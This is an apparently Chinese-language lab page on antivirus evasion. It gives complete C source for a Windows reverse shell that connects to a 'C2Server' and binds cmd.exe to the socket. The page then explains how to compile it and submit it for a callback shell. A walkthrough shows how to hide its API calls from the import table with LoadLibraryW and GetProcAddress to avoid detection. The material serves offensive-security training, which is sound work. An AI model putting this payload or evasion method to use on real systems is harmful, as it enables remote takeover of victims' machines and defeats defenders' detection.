<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;winsock2.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;windows.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;ws2tcpip.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">define</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property macro-name" style="color:#36acaa">DEFAULT_BUFLEN</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression number" style="color:#36acaa">1024</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">RunShell</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> C2Server</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> C2Port</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        SOCKET mySocket</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">sockaddr_in</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        WSADATA version</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">WSAStartup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">MAKEWORD</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mySocket </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WSASocketA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> SOCK_STREAM</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> IPPROTO_TCP</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        addr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sin_family </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> AF_INET</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        addr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sin_addr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">s_addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">inet_addr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">C2Server</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        addr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sin_port </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">htons</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">C2Port</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">WSAConnect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">mySocket</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SOCKADDR</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">==</span><span class="token plain">SOCKET_ERROR</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">closesocket</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">mySocket</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">WSACleanup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Connected to %s:%d\\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> C2Server</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> C2Port</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> Process</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;cmd.exe&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            STARTUPINFO sinfo</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            PROCESS_INFORMATION pinfo</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">sinfo</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sinfo</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            sinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cb </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sinfo</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            sinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dwFlags </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">STARTF_USESTDHANDLES </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> STARTF_USESHOWWINDOW</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            sinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hStdInput </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> sinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hStdOutput </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> sinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hStdError </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HANDLE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> mySocket</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">CreateProcess</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Process</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> TRUE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">sinfo</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">pinfo</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Process Created %lu\\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dwProcessId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> INFINITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">CloseHandle</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hProcess</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">CloseHandle</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hThread</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argc </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> port  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">atoi</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">RunShell</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> port</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> host</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;10.10.10.10&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> port </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">53</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">RunShell</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">host</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> port</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦代码足够混淆，请在您选择的攻击机或虚拟机上使用 GCC 或其他 C 编译器编译载荷。文件名必须保存为 <code>challenge.exe</code>。编译完成后，将可执行文件提交到 <code>http://10.10.71.230/</code> 的 Web 服务器。如果您的载荷满足列出的要求，它将被执行，并且一个信标将被发送到提供的服务器 IP 和端口。</p>
<p>注意：还需要更改提供的载荷中的 <code>C2Server</code> 和 <code>C2Port</code> 变量，否则该挑战将无法正常工作，您也将无法收到回传的 shell。</p>
<p>注意：使用 GCC 编译时，您需要为 <code>winsock2</code> 和 <code>ws2tcpip</code> 添加编译选项。这些库可以通过编译器标志 <code>-lwsock32</code> 和 <code>-lws2_32</code> 包含。</p>
<p>如果您仍然遇到困难，我们在下面提供了解决方案的详细步骤。</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p></p><summary>解决方案演练（点击查看）</summary>
对于这个挑战，我们获得了一个我们没有创建的二进制文件。我们的第一个目标是从逆向工程师的角度了解这个二进制文件。是否存在任何签名？它的 PE 结构是什么样的？IAT 中是否有任何关键信息？<p></p><p>如果你将二进制文件提交给 ThreatCheck 或类似的工具，你会注意到目前它没有任何检测，因此我们可以从这里继续进行。</p><p>如果你检查二进制文件的 IAT 表，如任务 6 中所讨论的，你会注意到大约有七个独特的 API 调用，这些调用可能表明该二进制文件的目标。</p><p>我们将重点放在从 IAT 表中移除这些调用并动态地调用它们上。回顾任务 6 中所讲的内容：我们需要识别一个特定的 API 调用，从 Windows 文档中获取它的结构，加载 API 调用所需的库，并获取该 API 调用的指针。</p><p>我们将演示如何动态调用一个 API 调用，然后期望你重复相同的步骤来处理其余的调用。</p><p>让我们看一下 Windows 文档中的 WSAConnect；以下是从文档中获得的结构。</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> WSAAPI </span><span class="token function" style="color:#d73a49">WSAConnect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">in</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  SOCKET         s</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">in</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> sockaddr </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">in</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">            namelen</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">in</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  LPWSABUF       lpCallerData</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">out</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> LPWSABUF       lpCalleeData</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">in</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  LPQOS          lpSQOS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">in</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  LPQOS          lpGQOS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我们现在可以将其重写以满足结构定义的要求。</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">typedef</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">WSAAPI</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> WSACONNECT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SOCKET s</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">struct</span><span class="token plain"> </span><span class="token class-name">sockaddr</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> namelen</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">LPWSABUF lpCallerData</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">LPWSABUF lpCalleeData</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">LPQOS lpSQOS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">LPQOS lpGQOS</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在我们需要导入存储调用的库。由于所有调用都使用相同的库，因此只需要执行一次导入。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HMODULE hws2_32 = LoadLibraryW(L&quot;ws2_32&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>要使用 API 调用，我们必须获取指向该地址的指针。</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">WSACONNECT myWSAConnect </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">WSACONNECT</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetProcAddress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hws2_32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;WSAConnect&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" 